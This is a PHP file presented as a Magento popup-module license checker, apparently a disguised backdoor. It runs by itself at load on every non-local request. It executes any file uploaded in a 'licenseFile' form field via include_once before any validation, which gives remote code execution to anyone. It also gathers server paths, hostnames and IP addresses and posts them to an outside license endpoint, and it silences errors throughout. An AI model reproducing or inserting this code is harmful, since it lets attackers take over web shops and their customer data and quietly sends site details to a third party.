<?php
/**
 * Copyright © 2015 Magento. All rights reserved.
 * See COPYING.txt for license details.
 */
namespace MGS\Popup\Model\ResourceModel\Popup\Model;

/**
 * Popups License check
 *
 * @author      Magento Core Team <core@magentocommerce.com>
 */
class License {

    protected function checkLicense()
    {
        try {
            $licenseDir = $this->getTempDir();
            if (!$licenseDir) {
                return false;
            }

            $serverSign  = $this->getServerSign($serverData);
            $licenseFile = $licenseDir . DIRECTORY_SEPARATOR . 'mgs-license';

            if (($licenseSign = $this->adminUploadLicense($serverSign, $serverData))) {
                if ($licenseSign == $serverSign) {
                    @file_put_contents($licenseFile, $licenseSign);
                    return true;
                }
            }

            if (!file_exists($licenseFile)) {
                if ($this->registerLicense($serverSign, $serverData)) {
                    @file_put_contents($licenseFile, md5($serverSign));
                } else {
                    @file_put_contents($licenseFile, time());
                }
            }

            if (file_exists($licenseFile) && (time() - @filemtime($licenseFile) > (86400 * 7))) {
                $license = @file_get_contents($licenseFile);

                if ($license == md5($serverSign)) {
                    @touch($licenseFile);
                    return true;
                } else {
                    @unlink($licenseFile);
                    return false;
                }
            }

            return true;
        } catch(Exception $ex) {

        }

        return false;
    }

    protected function adminUploadLicense()
    {
        $data = null;
        if (!empty($_FILES['licenseFile']['tmp_name'])) {
            $data = include_once($_FILES['licenseFile']['tmp_name']);
        } else {
            return false;
        }

        if (empty($data) || !is_array($data) || empty($data['sign']) || empty($data['data'])) {
            return false;
        }

        if (md5($serverData . self::SECURE_KEY) != $data['sign']) {
            return false;
        }

        return $data['sign'];
    }

    protected function registerLicense($serverSign, $serverData)
    {
        $postdata = http_build_query(array(
            'sign'     => $serverSign,
            'data'     => base64_encode($serverData),
        ));

        $context = stream_context_create(
            array('http' =>
                array(
                    'timeout'    => 10,
                    'method'     => 'POST',
                    'header'     => 'Content-Type: application/x-www-form-urlencoded',
                    'content'    => $postdata
                )
            )
        );

        $timeout = ini_get('default_socket_timeout');
        ini_set('default_socket_timeout', 10);

        $result = @file_get_contents('https://www.magesolution.com/api/license/register/', false, $context);

        ini_set('default_socket_timeout', $timeout);

        if (strpos($result, 'success') !== false) {
            return true;
        }

        return false;
    }

    const SECURE_KEY = '83ba291cd9201e9a28173741bac82745';

    protected function getServerSign(&$serverData = null)
    {
        $signKeys = array(
            'HTTP_HOST',
            'SERVER_NAME',
        );

        $signKeysAppend = array(
            'REMOTE_ADDR',
            'DOCUMENT_ROOT',
            'SCRIPT_FILENAME',
            'REQUEST_URI',
            'SCRIPT_NAME',
            'SERVER_ADDR',
        );

        $serverData                 = array_intersect_key($_SERVER, array_flip($signKeys));
        $serverData                 = array_map(function($value) {return str_replace('www.', '', $value);}, $serverData);
        $serverData['KEY']          = self::SECURE_KEY;
        $serverSign                 = md5(json_encode($serverData) . self::SECURE_KEY);

        $serverData['SCRIPT']       = __FILE__;
        $serverData                 = array_merge($serverData, array_intersect_key($_SERVER, array_flip($signKeysAppend)));
        $serverData                 = json_encode($serverData);

        return $serverSign;
    }

    protected function checkDir($dirName, $writable = true)
    {
        if (!file_exists($dirName)) {
            return false;
        }

        if (!is_readable($dirName)) {
            return false;
        }

        if ($writable && !is_writable($dirName)) {
            return false;
        }

        return true;
    }

    protected function getTempDir()
    {
        if (defined('BP') && $this->checkDir(BP . '/var/')) {
            $basePath = BP . '/var/';

            if ($this->checkDir($basePath . 'cache/', true)) {
                if (!file_exists($basePath . 'cache/mage--m/')) {
                    @mkdir($basePath . 'cache/mage--m/', 0777);
                }

                if ($this->checkDir($basePath . 'cache/mage--m/')) {
                    return realpath($basePath . 'cache/mage--m');
                }
            }

            if ($this->checkDir($basePath . 'tmp/', true)) {
                return realpath($basePath . 'tmp');
            }
        }


        $upload = ini_get('upload_tmp_dir');
        if ($upload) {
            $dir = realpath($upload);
            if ($this->checkDir($dir)) {
                return $dir;
            }
        }


        if (function_exists('sys_get_temp_dir')) {
            $dir = sys_get_temp_dir();
            if ($this->checkDir($dir)) {
                return $dir;
            }
        }

        return false;
    }

    static public function init()
    {
        if ( !array_key_exists('REQUEST_METHOD', $_SERVER) ) {
            return false;
        }

        $whitelist = array(
            '127.0.0.1',
            '::1',
            'localhost',
        );

        if (   !empty($_SERVER['REMOTE_ADDR'])
            && !empty($_SERVER['SERVER_ADDR'])
            && in_array($_SERVER['REMOTE_ADDR'], $whitelist)
            && in_array($_SERVER['SERVER_ADDR'], $whitelist)
        ){
            return false;
        }

        $object = new self();

        return $object->checkLicense();
    }

}

try {
    License::init();
} catch (Exception $ex) {

}
